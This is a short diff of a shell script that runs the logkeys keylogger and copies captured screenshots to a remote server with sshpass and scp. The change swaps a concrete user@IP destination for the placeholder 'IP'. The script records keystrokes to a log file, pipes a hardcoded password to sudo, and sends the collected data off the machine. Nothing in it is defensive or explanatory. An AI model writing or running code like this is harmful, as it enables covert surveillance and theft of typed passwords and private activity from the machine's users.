@@ -21,7 +21,7 @@ done
 cd /tmp
 #echo password | sudo logkeys --kill
 #zip -r -9 logs-`date '+%Y-%m-%d'` /tmp/kl
-sudo sshpass -p "PASSWORD" scp -r  /tmp/kl/screenshots roman@208.94.240.6:
+sudo sshpass -p "PASSWORD" scp -r  /tmp/kl/screenshots IP
 cd /tmp/kl
 echo password | sudo -S logkeys --start --output /tmp/kl/kl.log
 done
